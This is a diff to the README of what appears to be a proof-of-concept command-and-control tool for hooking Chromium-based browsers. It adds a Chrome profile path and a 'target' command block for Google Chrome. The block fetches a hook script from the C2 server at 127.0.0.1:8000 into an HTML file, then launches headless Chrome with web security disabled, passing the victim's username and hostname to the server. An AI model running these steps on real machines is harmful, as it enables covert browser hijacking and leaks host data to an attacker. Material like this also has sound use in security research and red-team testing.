@@ -29,6 +29,12 @@ Proof of concept of a command and control server enabling hooking of Chromium-ba
 > *"${HOME}/snap/chromium/common/chromium/Default"*
 >
 
+>
+> **Ubuntu 24.04.2 LTS and Google Chrome 136 (official build)**
+>
+> *"${HOME}/.config/google-chrome/Default"*
+>
+
 ## INSTALLATION
 
 For Debian-based Linux distributions.
@@ -75,6 +81,18 @@ target@target-computer:~$ # OR
 target@target-computer:~$ echo "<body><script src=\"http://127.0.0.1:8000/index.js\"></script>" > ./x.html
 
 target@target-computer:~$ chromium --disable-web-security --headless --no-first-run --user-data-dir="/tmp/${RANDOM}/" "file://${HOME}/x.html?u=${USER}&c=$(hostname)"
+```
+
+>
+> Steps to hook a Google Chrome browser on Debian-Based Linux distributions:
+>
+
+```bash
+target@target-computer:~$ wget --quiet --output-document="-" http://127.0.0.1:8000/ > ./x.html
+target@target-computer:~$ # OR
+target@target-computer:~$ echo "<body><script src=\"http://127.0.0.1:8000/index.js\"></script>" > ./x.html
+
+target@target-computer:~$ google-chrome --disable-web-security --headless --no-first-run --user-data-dir="/tmp/${RANDOM}/" "file://${HOME}/x.html?u=${USER}&c=$(hostname)"
 ```
 
 > [!NOTE]
